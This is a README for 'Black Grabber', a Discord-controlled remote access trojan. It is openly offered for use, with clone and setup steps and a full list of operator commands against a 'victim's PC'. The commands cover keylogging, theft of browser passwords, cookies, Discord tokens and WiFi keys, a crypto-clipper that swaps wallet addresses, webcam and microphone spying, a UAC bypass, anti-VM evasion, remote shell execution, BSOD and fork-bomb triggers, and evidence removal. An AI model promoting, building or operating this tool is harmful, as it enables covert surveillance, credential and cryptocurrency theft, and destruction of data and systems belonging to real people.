### Black Grabber
- Read our extensive Wiki for more information and detailed building instructions.
### BlackGrabber Community
- Join our Telegram and Discord servers for support, to ask questions, recommend features and talk to like minded people!
### Features
- Black Grabber malware can do plenty of things, like:
- handle multiple PCs (not only one, like in most of the cases)
- UAC Bypass (gain Administrative permissions on startup)
- delete itself whenever you want
- log every key pressed on keyboard (keylogger)
- take screenshots anytime you want
- record screen anytime you want
- elevate itself to critical process (will trigger Blue Screen of Death when killed)
- directly manipulate victim's PC graphics (display custom "things"->[bitmaps, images, texts, glitch effects])
- turn off/on monitors of victim's PC
- block access to any website
- browse and kill running processes
- disable processes (make certain processes impossible to run)
- communicate with the victim in several ways
- use Text-To-Speech on victim's PC
- take images from webcam
- block the mouse and keyboard
- steal saved WiFi passwords
- grab history, cookies and passwords saved in web browsers
- grab discord tokens
- grab system information
- manipulate Windows sounds settings (change the volume)
- play audio files on victim's PC (in background)
- record microphone input (24/7) and save it in .wav files
- tream live microphone input on voice channel
- browse files on target PC
- upload and download files from target PC
- remove files from target PC
- execute files on target PC
- replace copied crypto currency wallet addresses to your [configured] ones
- trigger jumpscares
- trigger Blue Screen of Death
- execute fork bomb (crash the PC)
- Anti-VM (Brack Grabber won't run on Virtual Machines, f.ex.: VirtualBox, VMWare)
- run shell commands (CMD/Powershell)
- Debug Mode for easier testing and contribution
### Preparation` git clone https://github.com/mategol/blackgrabber-malware
```cd blackgrabber-malware

```Create Discord BOT and server

```Windows: Run the blackgrabber.exe either from Command Line or double clicking on it

```Linux: Run the blackgrabber.sh from Command Line



 
.ss - take screenshot at any time
.screenrec - record the screen for 15 seconds
.critical-enable - elevates the process to critical status (.critical-disable to undo)
.display-graphic - manipulate low-level graphics by displaying pixels prepared in DrawlingStudio
.display-glitch <name> - display specified screen glitch
.monitors-off - turn off all monitors (.monitors-on to turn back on)
.website-block <website> - block specified website from being accessed from any browser (.website-unblock <website> to unblock it)
.show <what-to-show> - get list of running processes or available commands
.kill <process-name-or-id> - kill any running process
.blacklist <process-name> - adds specified process to the blacklist (victim won't be able to run it)
.whitelist <process-name> - removes specified process from the blacklist (victim will be able to run it)
.foreground - get active window process name
.msg title="<title>" text="<text>" style=<style> - send a message to victim and get the response
.tts <message> - plays a Text-to-Speech message on victim's PC
.webcam <action> - use connected webcam (currently supports photos shooting)
.block-input - block the mouse and keyboard(.unblock-input to unblock it)
.grab <what-to-grab> - grab for example saved passwords in web browsers
.volume <value> - change the audio output volume on victim's PC
.play [<file>] - play any .mp3 file on the victim's PC (existing one or sent in the next message if no filename was provided)
.join - join voice-channel and stream live microphone input
.pwd - show working directory
.ls - list content of working directory
.tree - show tree of working directory
.cd <directory> - change working directory
.upload <type> [<name>] - upload any file or zipped directory (also greater than 8MB ones) onto target PC
.download <file-or-directory> - download any file or zipped directory (also greater than 8MB ones) from target PC
.remove <file-or-directory> - remove file or directory on target PC
.execute <file> - run any file on target PC
.start-clipper - start crypto-clipper (swap crypto currency wallet addresses to your ones)(.stop-clipper to stop it)
.jumpscare [<preset>] - play very loud and rapidly flashing video or other graphics
.bsod - trigger Blue Screen of Death
.forkbomb - execute fork bomb
.cmd <command> - execute shell command on victim's PC and send back the output
.implode - remove PySilon from target PC and clean the "evidence"
.clear - clear messages from file-related channel


